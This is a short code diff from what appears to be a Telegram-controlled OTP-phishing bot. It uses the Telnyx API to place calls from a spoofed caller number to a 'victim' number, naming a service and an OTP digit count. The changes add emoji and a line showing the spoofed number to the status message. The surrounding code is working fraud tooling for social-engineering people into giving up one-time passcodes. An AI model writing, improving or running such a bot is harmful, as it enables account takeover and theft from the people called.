@@ -19,7 +19,7 @@ async function call (spoof, customer_number, ctx, service, digit){
    console.log(ctx, 'first yayyyy')
    // Use the Telnyx API to create a new call
    try {
-      await bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
+      await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
          reply_markup:{
             inline_keyboard: [
                [
@@ -92,10 +92,11 @@ bot.command('call', ctx => {
    else{
       bot.telegram.sendMessage(ctx.chat.id, 
          `
-✅CALL STARTING\n 
-✅VICTIM NUBER - ${number}\n 
-✅SERIVCE - ${service}\n
-✅OTP DIGIT - ${digit} 
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${service}\n
+✅ OTP DIGIT - ${digit} 
          `, {})
 
       call(spoof, number, ctx, service, 6)
